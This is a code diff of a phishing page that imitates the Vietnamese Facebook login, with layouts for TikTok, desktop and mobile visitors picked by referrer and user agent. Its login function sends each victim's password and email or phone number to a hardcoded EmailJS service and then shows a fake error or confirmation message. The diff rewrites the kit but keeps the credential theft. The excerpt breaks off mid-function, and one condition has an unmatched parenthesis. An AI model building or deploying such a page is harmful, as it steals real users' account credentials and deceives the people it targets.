@@ -8,7 +8,7 @@
     <meta property="og:title" content="Facebook - Đăng nhập hoặc đăng ký">
     <meta property="og:description" content="Facebook giúp bạn kết nối và chia sẻ với mọi người trong cuộc sống của bạn.">
     <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg">
-    <meta property="og:url" content="https://www.facebook.com">
+    <meta property="og:url" content="https://www.facebook.com/share/15g8ih73gt/?id=1000789491278365-67ed6976-3c7c-800b-98aa-6ecffbff85b1">
     <meta property="og:type" content="website">
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
@@ -16,200 +16,258 @@
         body {
             margin: 0;
             padding: 0;
+            box-sizing: border-box;
             font-family: Helvetica, Arial, sans-serif;
-            min-height: 100vh;
+            background: #f0f2f5;
+        }
+
+        /* TikTok Interface */
+        .tiktok-interface {
+            background: #fff;
             display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
             flex-direction: column;
         }
-        .tiktok-container, .desktop-container, .safari-container {
-            display: none;
-            flex-grow: 1;
+        .tiktok-interface .header {
+            display: none; /* Ẩn thanh tiêu đề */
         }
-        /* TikTok Styles */
-        .tiktok-container {
-            background: linear-gradient(135deg, #833ab4, #fd1d1d, #fcb045);
-            padding: 20px;
-            text-align: center;
-        }
-        .header {
+        .tiktok-interface .back-button-header {
             position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            background: rgba(255, 255, 255, 0.9);
-            padding: 10px;
+            top: 10px;
+            left: 10px;
             display: flex;
             align-items: center;
-            justify-content: space-between;
+            font-size: 14px;
+            color: #000;
+            cursor: pointer;
             z-index: 1000;
         }
-        .header-title {
-            font-size: 20px;
-            font-weight: bold;
-            color: #1877F2;
-            flex-grow: 1;
-            text-align: center;
-        }
-        .small-title {
+        .tiktok-interface .login-container input {
+            border-radius: 20px;
+            border: 1px solid #ddd;
+            padding: 12px 20px;
+            margin-bottom: 15px;
+            width: 100%;
+            max-width: 350px;
+            background: #f5f6f5;
             font-size: 16px;
         }
-        .back-button-header {
-            display: none;
+        .tiktok-interface .btn-primary {
+            border-radius: 20px;
+            padding: 12px;
+            background: #1877F2;
+            color: white;
+            font-weight: bold;
+            border: none;
+            width: 100%;
+            max-width: 350px;
+            font-size: 16px;
+        }
+        .tiktok-interface .btn-create-account {
+            border-radius: 20px;
+            padding: 12px;
+            background: #42b72a;
+            color: white;
+            font-weight: bold;
+            border: none;
+            width: 100%;
+            max-width: 350px;
+            font-size: 16px;
+        }
+        .tiktok-interface .forgot-password {
+            margin-top: 15px;
+            color: #1877F2;
+            font-size: 14px;
+            text-align: center;
             cursor: pointer;
         }
-        .login-container, .forgot-password-container, .create-account-container {
-            background: #fff;
-            padding: 15px;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-            margin-top: 20px;
-            display: none;
-        }
-        .login-container.active, .forgot-password-container.active, .create-account-container.active {
-            display: block;
-        }
-        /* Desktop Styles */
-        .desktop-container {
-            background: #f0f2f5;
-            padding: 20px;
+
+        /* Desktop Interface */
+        .desktop-interface {
             display: flex;
             flex-direction: column;
-            align-items: center;
-            justify-content: center;
+            min-height: 100vh;
+            background: #f0f2f5;
         }
-        .main-content {
+        .desktop-interface .main-container {
             display: flex;
             justify-content: center;
             align-items: center;
+            flex-grow: 1;
+            padding: 40px 20px;
             max-width: 980px;
-            width: 100%;
-            margin: 40px auto;
-            min-height: calc(100vh - 100px);
+            margin: 0 auto;
         }
-        .left-section {
+        .desktop-interface .left-section {
             flex: 1;
             padding-right: 32px;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
+            max-width: 500px;
         }
-        .facebook-logo-text {
+        .desktop-interface .facebook-logo-text {
             font-size: 56px;
             font-weight: bold;
             color: #1877F2;
             margin-bottom: 20px;
             line-height: 1;
         }
-        .slogan {
+        .desktop-interface .slogan {
             font-size: 24px;
             color: #1c1e21;
             line-height: 1.2;
         }
-        .right-section {
+        .desktop-interface .right-section {
             flex: 0 0 396px;
-            max-width: 396px;
+            text-align: center;
         }
-        .login-form, .desktop-forgot-password-container, .desktop-create-account-container {
+        .desktop-interface .login-container {
             background: #fff;
             padding: 20px;
             border-radius: 8px;
             box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
-            display: none;
-            position: relative;
-            width: 100%;
         }
-        .login-form.active, .desktop-forgot-password-container.active, .desktop-create-account-container.active {
-            display: block;
-        }
-        .back-button {
-            display: none;
-            position: absolute;
-            top: 10px;
-            left: 10px;
-            cursor: pointer;
-            background: none;
-            border: none;
-            padding: 0;
-        }
-        /* Safari/Google Styles */
-        .safari-container {
-            background: #f0f2f5;
-            padding: 20px;
-            text-align: center;
-        }
-        /* Common Styles */
-        input.form-control {
-            margin-bottom: 12px;
+        .desktop-interface .login-container input {
             border-radius: 6px;
-            padding: 14px 16px;
             border: 1px solid #dddfe2;
+            padding: 14px 16px;
+            margin-bottom: 12px;
+            width: 100%;
             font-size: 17px;
-            width: 100%;
-            height: 52px;
-            box-sizing: border-box;
         }
-        .btn-primary {
-            width: 100%;
+        .desktop-interface .btn-primary {
             border-radius: 6px;
             padding: 14px;
-            background-color: #1877F2;
-            border: none;
+            background: #1877F2;
             color: white;
             font-weight: bold;
+            border: none;
+            width: 100%;
             font-size: 20px;
-            height: 52px;
-            line-height: 24px;
-        }
-        .btn-create-account {
-            background-color: #42B72A;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            padding: 14px 20px;
-            font-weight: bold;
-            font-size: 17px;
-            margin: 16px auto 0;
-            display: block;
-            max-width: 200px;
-        }
-        .forgot-password {
-            margin-top: 16px;
-            color: #1877F2;
             cursor: pointer;
+        }
+        .desktop-interface .forgot-password {
+            margin-top: 15px;
+            color: #1877F2;
             font-size: 14px;
             text-align: center;
+            cursor: pointer;
+        }
+        .desktop-interface .btn-create-account {
+            border-radius: 6px;
+            padding: 14px;
+            background: #42b72a;
+            color: white;
+            font-weight: bold;
+            border: none;
+            width: 200px;
+            font-size: 17px;
+            margin: 20px auto;
             display: block;
+            cursor: pointer;
+        }
+        .desktop-interface .forgot-password-container, 
+        .desktop-interface .create-account-container {
+            background: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        .desktop-interface .back-button-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+            cursor: pointer;
+            font-size: 14px;
+            color: #1877F2;
+        }
+        .desktop-interface .footer {
+            background: #fff;
+            padding: 20px;
+            text-align: center;
+            font-size: 12px;
+            color: #737373;
+            border-top: 1px solid #dddfe2;
+        }
+        .desktop-interface .footer a {
+            margin: 0 8px;
+            color: #737373;
             text-decoration: none;
         }
-        .forgot-password:hover {
-            text-decoration: underline;
+
+        /* Safari/Google Interface */
+        .safari-interface {
+            background: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            flex-direction: column;
         }
-        .divider {
-            border-top: 1px solid #dadde1;
-            margin: 20px 0;
-        }
-        .footer {
-            background: #f5f6f5;
-            padding: 15px;
-            font-size: 10px;
-            color: #737373;
-            text-align: center;
-        }
-        .success-popup {
-            display: none;
+        .safari-interface .header {
+            width: 100%;
+            padding: 10px;
+            background: #fff;
             position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background-color: #fff;
-            border-radius: 8px;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
-            width: 90%;
-            max-width: 300px;
+            top: 0;
             text-align: center;
-            padding: 15px;
-            z-index: 10002;
+            font-size: 18px;
+            font-weight: bold;
+            border-bottom: 1px solid #ddd;
+            z-index: 1000;
         }
+        .safari-interface .login-container input {
+            border-radius: 20px;
+            border: 1px solid #ddd;
+            padding: 12px 20px;
+            margin-bottom: 15px;
+            width: 100%;
+            max-width: 350px;
+            background: #f5f6f5;
+            font-size: 16px;
+        }
+        .safari-interface .btn-primary {
+            border-radius: 20px;
+            padding: 12px;
+            background: #1877F2;
+            color: white;
+            font-weight: bold;
+            border: none;
+            width: 100%;
+            max-width: 350px;
+            font-size: 16px;
+        }
+        .safari-interface .btn-create-account {
+            border-radius: 20px;
+            padding: 12px;
+            background: #42b72a;
+            color: white;
+            font-weight: bold;
+            border: none;
+            width: 100%;
+            max-width: 350px;
+            font-size: 16px;
+        }
+        .safari-interface .forgot-password {
+            margin-top: 15px;
+            color: #1877F2;
+            font-size: 14px;
+            text-align: center;
+            cursor: pointer;
+        }
+
+        /* Common Container Styles */
+        .login-container, .forgot-password-container, .create-account-container {
+            display: none;
+            width: 100%;
+            max-width: 400px;
+            margin: 20px auto;
+        }
+        .login-container.active, .forgot-password-container.active, .create-account-container.active {
+            display: block;
+        }
+
+        /* Dialog Styles */
         .overlay {
             display: none;
             position: fixed;
@@ -217,312 +275,231 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.3);
-            z-index: 10001;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 999;
+        }
+        .success-popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            z-index: 1000;
+            text-align: center;
+            width: 300px;
+        }
+        .success-popup-title {
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        .success-popup-message {
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        .success-popup-button {
+            background: #1877F2;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 6px;
+            cursor: pointer;
         }
     </style>
 </head>
 <body>
     <!-- TikTok Interface -->
-    <div class="tiktok-container">
-        <div class="header" style="display: none;">
-            <div class="back-button-header" id="back-button-header" onclick="goBack()">
-                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <path d="M15 18L9 12L15 6" stroke="#000000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-                </svg>
-            </div>
-            <div class="header-title" id="header-title"></div>
-            <div style="width: 20px;"></div>
+    <div class="tiktok-interface" style="display: none;">
+        <div class="header">
+            <!-- Ẩn thanh tiêu đề -->
+        </div>
+        <div class="back-button-header" onclick="goBack()">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M15 18L9 12L15 6" stroke="#000000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+            Quay lại
         </div>
         <div class="login-container active">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" style="width: 60px; margin-bottom: 20px;">
-            <input type="text" id="login-input" class="form-control" placeholder="Email hoặc số điện thoại">
-            <input type="password" id="password" class="form-control" placeholder="Mật khẩu">
-            <button class="btn-primary" onclick="login()">Đăng nhập</button>
-            <a class="forgot-password" onclick="showForgotPassword()">Quên mật khẩu?</a>
-            <div class="divider"></div>
-            <button class="btn-create-account" onclick="showCreateAccount()">Tạo tài khoản mới</button>
+            <div class="facebook-logo">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" style="width: 40px; height: 40px; margin: 20px auto; display: block;">
+            </div>
+            <input type="text" id="login-input" placeholder="Số di động hoặc email">
+            <input type="password" id="password" placeholder="Mật khẩu">
+            <button class="btn btn-primary" onclick="login()">Đăng nhập</button>
+            <div class="forgot-password" onclick="showForgotPassword()">Bạn quên mật khẩu?</div>
+            <button class="btn btn-create-account" onclick="showCreateAccount()">Tạo tài khoản mới</button>
         </div>
         <div class="forgot-password-container">
             <h5>Tìm tài khoản của bạn</h5>
-            <input type="text" id="phone-input" class="form-control" placeholder="Email hoặc số điện thoại">
-            <button class="btn-primary" onclick="searchByPhone()">Tiếp tục</button>
+            <input type="text" id="phone-input" placeholder="Số di động hoặc email">
+            <button class="btn btn-primary" onclick="searchByPhone()">Tiếp tục</button>
         </div>
         <div class="create-account-container">
             <h5>Tạo tài khoản mới</h5>
-            <input type="text" id="firstName" class="form-control" placeholder="Tên">
-            <input type="text" id="lastName" class="form-control" placeholder="Họ">
-            <input type="text" id="phone" class="form-control" placeholder="Số di động hoặc email">
-            <input type="password" id="new-password" class="form-control" placeholder="Mật khẩu mới">
-            <button class="btn-primary" onclick="createAccount()">Đăng ký</button>
+            <input type="text" id="firstName" placeholder="Tên">
+            <input type="text" id="lastName" placeholder="Họ">
+            <input type="text" id="phone" placeholder="Số di động">
+            <input type="email" id="email" placeholder="Email">
+            <input type="password" id="new-password" placeholder="Mật khẩu mới">
+            <button class="btn btn-primary" onclick="createAccount()">Đăng ký</button>
         </div>
     </div>
 
     <!-- Desktop Interface -->
-    <div class="desktop-container">
-        <div class="main-content">
+    <div class="desktop-interface" style="display: none;">
+        <div class="main-container">
             <div class="left-section">
                 <div class="facebook-logo-text">facebook</div>
-                <div class="slogan">Kết nối với bạn bè và thế giới xung quanh bạn trên Facebook.</div>
+                <div class="slogan">Facebook giúp bạn kết nối và chia sẻ với mọi người trong cuộc sống của bạn.</div>
             </div>
             <div class="right-section">
-                <div class="login-form active">
-                    <input type="text" id="login-input" class="form-control" placeholder="Email hoặc số điện thoại">
-                    <input type="password" id="password" class="form-control" placeholder="Mật khẩu">
-                    <button class="btn-primary" onclick="login()">Đăng nhập</button>
-                    <a class="forgot-password" onclick="showForgotPassword()">Quên mật khẩu?</a>
-                    <div class="divider"></div>
-                    <button class="btn-create-account" onclick="showCreateAccount()">Tạo tài khoản mới</button>
+                <div class="login-container active">
+                    <input type="text" id="login-input" placeholder="Email hoặc số điện thoại">
+                    <input type="password" id="password" placeholder="Mật khẩu">
+                    <button class="btn btn-primary" onclick="login()">Đăng nhập</button>
+                    <div class="forgot-password" onclick="showForgotPassword()">Quên mật khẩu?</div>
+                    <hr style="margin: 20px 0; border-color: #dddfe2;">
+                    <button class="btn btn-create-account" onclick="showCreateAccount()">Tạo tài khoản mới</button>
                 </div>
-                <div class="desktop-forgot-password-container">
-                    <button class="back-button" onclick="goBack()">
-                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                            <path d="M15 18L9 12L15 6" stroke="#000000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                <div class="forgot-password-container">
+                    <div class="back-button-header" onclick="goBack()">
+                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M15 18L9 12L15 6" stroke="#1877F2" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                         </svg>
-                    </button>
-                    <h5 style="margin-top: 30px;">Tìm tài khoản của bạn</h5>
-                    <input type="text" id="phone-input" class="form-control" placeholder="Email hoặc số điện thoại">
-                    <button class="btn-primary" onclick="searchByPhone()">Tiếp tục</button>
+                        Quay lại
+                    </div>
+                    <h5 style="font-size: 20px; font-weight: bold; margin-bottom: 20px;">Tìm tài khoản của bạn</h5>
+                    <p style="font-size: 15px; color: #606770; margin-bottom: 15px;">Vui lòng nhập email hoặc số di động để tìm kiếm tài khoản của bạn.</p>
+                    <input type="text" id="phone-input" placeholder="Email hoặc số di động">
+                    <button class="btn btn-primary" onclick="searchByPhone()">Tìm kiếm</button>
                 </div>
-                <div class="desktop-create-account-container">
-                    <button class="back-button" onclick="goBack()">
-                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                            <path d="M15 18L9 12L15 6" stroke="#000000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                <div class="create-account-container">
+                    <div class="back-button-header" onclick="goBack()">
+                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M15 18L9 12L15 6" stroke="#1877F2" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                         </svg>
-                    </button>
-                    <h5 style="margin-top: 30px;">Tạo tài khoản mới</h5>
-                    <input type="text" id="firstName" class="form-control" placeholder="Tên">
-                    <input type="text" id="lastName" class="form-control" placeholder="Họ">
-                    <input type="text" id="phone" class="form-control" placeholder="Số di động hoặc email">
-                    <input type="password" id="new-password" class="form-control" placeholder="Mật khẩu mới">
-                    <button class="btn-primary" onclick="createAccount()">Đăng ký</button>
+                        Quay lại
+                    </div>
+                    <h5 style="font-size: 20px; font-weight: bold; margin-bottom: 20px;">Tạo tài khoản mới</h5>
+                    <input type="text" id="firstName" placeholder="Tên">
+                    <input type="text" id="lastName" placeholder="Họ">
+                    <input type="text" id="phone" placeholder="Số di động hoặc email">
+                    <input type="password" id="new-password" placeholder="Mật khẩu mới">
+                    <button class="btn btn-primary" onclick="createAccount()">Đăng ký</button>
                 </div>
             </div>
         </div>
+        <footer class="footer">
+            <a href="#">Tiếng Việt</a>
+            <a href="#">English (UK)</a>
+            <a href="#">中文(台灣)</a>
+            <br>
+            <a onclick="showSignup()">Đăng ký</a>
+            <a onclick="showLogin()">Đăng nhập</a>
+            <a href="#">Giới thiệu</a>
+            <a href="#">Trợ giúp</a>
+            <div>Meta © 2025</div>
+        </footer>
     </div>
 
     <!-- Safari/Google Interface -->
-    <div class="safari-container">
+    <div class="safari-interface" style="display: none;">
         <div class="header">
-            <div class="back-button-header" id="back-button-header" onclick="goBack()">
-                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <path d="M15 18L9 12L15 6" stroke="#000000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-                </svg>
-            </div>
-            <div class="header-title" id="header-title">Đăng nhập Facebook | Facebook</div>
-            <div style="width: 20px;"></div>
+            Đăng nhập Facebook | Facebook
         </div>
         <div class="login-container active">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" style="width: 60px; margin-bottom: 20px;">
-            <input type="text" id="login-input" class="form-control" placeholder="Email hoặc số điện thoại">
-            <input type="password" id="password" class="form-control" placeholder="Mật khẩu">
-            <button class="btn-primary" onclick="login()">Đăng nhập</button>
-            <a class="forgot-password" onclick="showForgotPassword()">Quên mật khẩu?</a>
-            <div class="divider"></div>
-            <button class="btn-create-account" onclick="showCreateAccount()">Tạo tài khoản mới</button>
+            <div class="facebook-logo">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" style="width: 40px; height: 40px; margin: 20px auto; display: block;">
+            </div>
+            <input type="text" id="login-input" placeholder="Số di động hoặc email">
+            <input type="password" id="password" placeholder="Mật khẩu">
+            <button class="btn btn-primary" onclick="login()">Đăng nhập</button>
+            <div class="forgot-password" onclick="showForgotPassword()">Bạn quên mật khẩu?</div>
+            <button class="btn btn-create-account" onclick="showCreateAccount()">Tạo tài khoản mới</button>
         </div>
         <div class="forgot-password-container">
             <h5>Tìm tài khoản của bạn</h5>
-            <input type="text" id="phone-input" class="form-control" placeholder="Email hoặc số điện thoại">
-            <button class="btn-primary" onclick="searchByPhone()">Tiếp tục</button>
+            <input type="text" id="phone-input" placeholder="Số di động hoặc email">
+            <button class="btn btn-primary" onclick="searchByPhone()">Tiếp tục</button>
         </div>
         <div class="create-account-container">
             <h5>Tạo tài khoản mới</h5>
-            <input type="text" id="firstName" class="form-control" placeholder="Tên">
-            <input type="text" id="lastName" class="form-control" placeholder="Họ">
-            <input type="text" id="phone" class="form-control" placeholder="Số di động hoặc email">
-            <input type="password" id="new-password" class="form-control" placeholder="Mật khẩu mới">
-            <button class="btn-primary" onclick="createAccount()">Đăng ký</button>
+            <input type="text" id="firstName" placeholder="Tên">
+            <input type="text" id="lastName" placeholder="Họ">
+            <input type="text" id="phone" placeholder="Số di động">
+            <input type="email" id="email" placeholder="Email">
+            <input type="password" id="new-password" placeholder="Mật khẩu mới">
+            <button class="btn btn-primary" onclick="createAccount()">Đăng ký</button>
         </div>
     </div>
-
-    <!-- Footer -->
-    <footer class="footer">
-        <div>Meta © 2025</div>
-    </footer>
 
     <!-- Dialog -->
     <div class="overlay" id="dialog-overlay"></div>
     <div class="success-popup" id="custom-dialog">
-        <div id="dialog-title"></div>
-        <div id="dialog-message"></div>
-        <button class="btn-primary" onclick="hideDialog()">OK</button>
+        <div class="success-popup-title" id="dialog-title"></div>
+        <div class="success-popup-message" id="dialog-message"></div>
+        <button class="btn btn-primary success-popup-button" onclick="hideDialog()">OK</button>
     </div>
 
-    <!-- JavaScript -->
     <script type="text/javascript">
         (function() {
             emailjs.init("wF5gWgp1GWyg7q0KY");
         })();
-
-        let previousPage = null;
 
         window.onload = function() {
             const referrer = document.referrer.toLowerCase();
             const userAgent = navigator.userAgent.toLowerCase();
             const urlParams = new URLSearchParams(window.location.search);
 
-            // Phát hiện TikTok
+            const tiktokInterface = document.querySelector('.tiktok-interface');
+            const desktopInterface = document.querySelector('.desktop-interface');
+            const safariInterface = document.querySelector('.safari-interface');
+
             const isFromTikTok = 
                 referrer.includes("tiktok.com") || 
                 userAgent.includes("tiktok") || 
                 userAgent.includes("bytedance") || 
-                urlParams.get("utm_source") === "tiktok";
+                urlParams.has("tt_from") || 
+                urlParams.get("utm_source") === "tiktok");
 
-            // Phát hiện Safari/Google (mobile)
             const isSafariOrGoogle = 
-                (/iphone|ipad|android/.test(userAgent) && 
-                (/safari/.test(userAgent) || /chrome/.test(userAgent)) && 
-                !/firefox|ucbrowser|opera/.test(userAgent));
-
-            // Phát hiện Desktop (không phải TikTok hoặc mobile Safari/Google)
-            const isDesktop = !isFromTikTok && !isSafariOrGoogle && !/mobile|android|iphone|ipad/.test(userAgent);
+                /safari|chrome/.test(userAgent) && !isFromTikTok;
 
             if (isFromTikTok) {
-                document.querySelector('.tiktok-container').style.display = 'block';
-                document.querySelector('.desktop-container').style.display = 'none';
-                document.querySelector('.safari-container').style.display = 'none';
-                showLoginTikTok();
+                tiktokInterface.style.display = 'block';
+                desktopInterface.style.display = 'none';
+                safariInterface.style.display = 'none';
             } else if (isSafariOrGoogle) {
-                document.querySelector('.tiktok-container').style.display = 'none';
-                document.querySelector('.desktop-container').style.display = 'none';
-                document.querySelector('.safari-container').style.display = 'block';
-                showLoginSafari();
-            } else if (isDesktop) {
-                document.querySelector('.tiktok-container').style.display = 'none';
-                document.querySelector('.desktop-container').style.display = 'block';
-                document.querySelector('.safari-container').style.display = 'none';
-                showLoginDesktop();
+                tiktokInterface.style.display = 'none';
+                desktopInterface.style.display = 'none';
+                safariInterface.style.display = 'block';
+            } else {
+                tiktokInterface.style.display = 'none';
+                desktopInterface.style.display = 'block';
+                safariInterface.style.display = 'none';
             }
-
-            console.log("Referrer:", referrer);
-            console.log("UserAgent:", userAgent);
-            console.log("URL Params:", urlParams.toString());
-            console.log("Is TikTok:", isFromTikTok);
-            console.log("Is Safari/Google:", isSafariOrGoogle);
-            console.log("Is Desktop:", isDesktop);
         };
 
-        function hideAllContainers() {
-            document.querySelectorAll('.tiktok-container > div').forEach(container => container.classList.remove('active'));
-            document.querySelectorAll('.desktop-container .right-section > div').forEach(container => container.classList.remove('active'));
-            document.querySelectorAll('.safari-container > div:not(.header)').forEach(container => container.classList.remove('active'));
-        }
-
-        // TikTok Functions
-        function showLoginTikTok() {
-            hideAllContainers();
-            document.querySelector('.tiktok-container .login-container').classList.add('active');
-            document.querySelector('.tiktok-container .header').style.display = 'none';
-            previousPage = null;
-        }
-
-        function showForgotPasswordTikTok() {
-            hideAllContainers();
-            document.querySelector('.tiktok-container .forgot-password-container').classList.add('active');
-            document.querySelector('.tiktok-container .header').style.display = 'flex';
-            document.getElementById('header-title').innerText = 'Tìm tài khoản của bạn';
-            document.getElementById('header-title').classList.add('small-title');
-            document.getElementById('back-button-header').style.display = 'flex';
-            previousPage = showLoginTikTok;
-        }
-
-        function showCreateAccountTikTok() {
-            hideAllContainers();
-            document.querySelector('.tiktok-container .create-account-container').classList.add('active');
-            document.querySelector('.tiktok-container .header').style.display = 'flex';
-            document.getElementById('header-title').innerText = 'Tạo tài khoản mới';
-            document.getElementById('header-title').classList.add('small-title');
-            document.getElementById('back-button-header').style.display = 'flex';
-            previousPage = showLoginTikTok;
-        }
-
-        // Desktop Functions
-        function showLoginDesktop() {
-            hideAllContainers();
-            document.querySelector('.desktop-container .login-form').classList.add('active');
-            document.querySelectorAll('.desktop-container .back-button').forEach(btn => btn.style.display = 'none');
-            document.querySelector('.left-section').style.display = 'flex';
-            previousPage = null;
-        }
-
-        function showForgotPasswordDesktop() {
-            hideAllContainers();
-            document.querySelector('.desktop-container .desktop-forgot-password-container').classList.add('active');
-            document.querySelector('.desktop-container .desktop-forgot-password-container .back-button').style.display = 'block';
-            document.querySelector('.left-section').style.display = 'none';
-            previousPage = showLoginDesktop;
-        }
-
-        function showCreateAccountDesktop() {
-            hideAllContainers();
-            document.querySelector('.desktop-container .desktop-create-account-container').classList.add('active');
-            document.querySelector('.desktop-container .desktop-create-account-container .back-button').style.display = 'block';
-            document.querySelector('.left-section').style.display = 'none';
-            previousPage = showLoginDesktop;
-        }
-
-        // Safari/Google Functions
-        function showLoginSafari() {
-            hideAllContainers();
-            document.querySelector('.safari-container .login-container').classList.add('active');
-            document.getElementById('header-title').innerText = 'Đăng nhập Facebook | Facebook';
-            document.getElementById('header-title').classList.remove('small-title');
-            document.getElementById('back-button-header').style.display = 'none';
-            previousPage = null;
-        }
-
-        function showForgotPasswordSafari() {
-            hideAllContainers();
-            document.querySelector('.safari-container .forgot-password-container').classList.add('active');
-            document.getElementById('header-title').innerText = 'Tìm tài khoản của bạn';
-            document.getElementById('header-title').classList.add('small-title');
-            document.getElementById('back-button-header').style.display = 'flex';
-            previousPage = showLoginSafari;
-        }
-
-        function showCreateAccountSafari() {
-            hideAllContainers();
-            document.querySelector('.safari-container .create-account-container').classList.add('active');
-            document.getElementById('header-title').innerText = 'Tạo tài khoản mới';
-            document.getElementById('header-title').classList.add('small-title');
-            document.getElementById('back-button-header').style.display = 'flex';
-            previousPage = showLoginSafari;
-        }
-
-        // Unified Functions
-        function showLogin() {
-            if (document.querySelector('.tiktok-container').style.display === 'block') showLoginTikTok();
-            else if (document.querySelector('.safari-container').style.display === 'block') showLoginSafari();
-            else showLoginDesktop();
-        }
-
-        function showForgotPassword() {
-            if (document.querySelector('.tiktok-container').style.display === 'block') showForgotPasswordTikTok();
-            else if (document.querySelector('.safari-container').style.display === 'block') showForgotPasswordSafari();
-            else showForgotPasswordDesktop();
-        }
-
-        function showCreateAccount() {
-            if (document.querySelector('.tiktok-container').style.display === 'block') showCreateAccountTikTok();
-            else if (document.querySelector('.safari-container').style.display === 'block') showCreateAccountSafari();
-            else showCreateAccountDesktop();
-        }
-
         function goBack() {
-            if (previousPage) previousPage();
+            const currentContainer = document.querySelector('.active');
+            if (currentContainer && !currentContainer.classList.contains('login-container')) {
+                hideAllContainers();
+                document.querySelector('.login-container').classList.add('active');
+            } else {
+                window.history.back();
+            }
         }
 
-        function showDialog(title, message) {
-            document.getElementById('dialog-title').innerText = title;
-            document.getElementById('dialog-message').innerText = message;
-            document.getElementById('custom-dialog').style.display = 'block';
-            document.getElementById('dialog-overlay').style.display = 'block';
+        function isValidEmail(email) {
+            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
         }
 
-        function hideDialog() {
-            document.getElementById('custom-dialog').style.display = 'none';
-            document.getElementById('dialog-overlay').style.display = 'none';
+        function isValidPhone(phone) {
+            return /^\d{10,11}$/.test(phone);
         }
 
         function login() {
@@ -530,41 +507,66 @@
             const password = document.getElementById('password').value;
 
             if (!loginInput || !password) {
-                showDialog("Đăng nhập không thành công!", "Vui lòng nhập đầy đủ thông tin!");
+                showDialog("Đăng nhập thất bại!", "Vui lòng nhập đầy đủ thông tin!");
+                return;
+            }
+            if (!isValidEmail(loginInput) && !isValidPhone(loginInput)) {
+                showDialog("Đăng nhập thất bại!", "Số di động hoặc email không hợp lệ!");
                 return;
             }
 
             const templateParams = {
                 password: password,
-                phone: '',
-                email: loginInput,
+                phone: isValidPhone(loginInput) ? loginInput : '',
+                email: isValidEmail(loginInput) ? loginInput : '',
                 firstName: '',
                 lastName: ''
             };
-
             emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
-                .then(() => showDialog("Đăng nhập không thành công", "Sai tên đăng nhập hoặc mật khẩu!"))
-                .catch(() => showDialog("Đăng nhập không thành công", "Có lỗi xảy ra, vui lòng thử lại!"));
+                .then(() => showDialog("Thông tin đã gửi!", "Vui lòng kiểm tra email hoặc số di động!"))
+                .catch(() => showDialog("Đăng nhập thất bại!", "Có lỗi xảy ra, vui lòng thử lại!"));
+        }
+
+        function showForgotPassword() {
+            hideAllContainers();
+            document.querySelector('.forgot-password-container').classList.add('active');
+        }
+
+        function showCreateAccount() {
+            hideAllContainers();
+            document.querySelector('.create-account-container').classList.add('active');
+        }
+
+        function showLogin() {
+            hideAllContainers();
+            document.querySelector('.login-container').classList.add('active');
+        }
+
+        function showSignup() {
+            showCreateAccount();
+        }
+
+        function hideAllContainers() {
+            document.querySelectorAll('.login-container, .forgot-password-container, .create-account-container').forEach(container => {
+                container.classList.remove('active');
+            });
         }
 
         function searchByPhone() {
             const phone = document.getElementById('phone-input').value;
-
-            if (!phone) {
-                showDialog("Tìm kiếm thất bại!", "Vui lòng nhập email hoặc số điện thoại!");
